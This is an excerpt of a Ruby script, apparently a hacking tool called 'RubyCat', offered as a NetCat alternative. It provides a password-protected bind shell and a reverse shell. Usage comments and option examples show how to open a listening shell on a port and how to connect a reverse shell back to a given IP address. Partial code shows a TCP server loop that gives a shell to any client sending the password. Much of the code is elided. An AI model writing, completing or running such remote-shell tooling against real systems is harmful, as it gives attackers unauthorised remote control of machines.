...
#
# *** Bind Shell with Password ***
#   ./rubycat.rb -b -p 5555 -P passw0rd
# 
# *** Reverse Shell ***
#   ./rubycat.rb -r -i 192.168.1.5 -p 5555
#
...
def banner
  puts
  puts "RubyCat - NetCat Alternative"
end
...
class RubyCat
  ...
  # Password Required to Access, default: passw0rd
  # Send Password as first send when connecting or get rejected!
  def bind_shell(port=31337, password='passw0rd')
    # Messages for those who visit but don't have proper pass
    @greetz=["Piss Off !!!", "Run along now, nothing to see here :("]
    ...
    Socket.tcp_server_loop("#{port}") do |socket, client_addrinfo|
      ...
      if command.downcase == password
        ...
        socket.puts "Type 'EXIT' or 'QUIT' to exit shell and keep port listening"
        socket.puts "Type 'KILL' or 'CLOSE' to close listenr\n\n"
  ...
  def reverse_shell(ip='0.0.0.0', port=31337, retries='5')
...
optparse = OptionParser.new do |opts| 
  ...
  opts.separator "EX: #{$0} -b -p 31337 -P passw0rd"
  opts.separator "EX: #{$0} -r -i 192.168.1.5 -p 31337"
  opts.separator ""
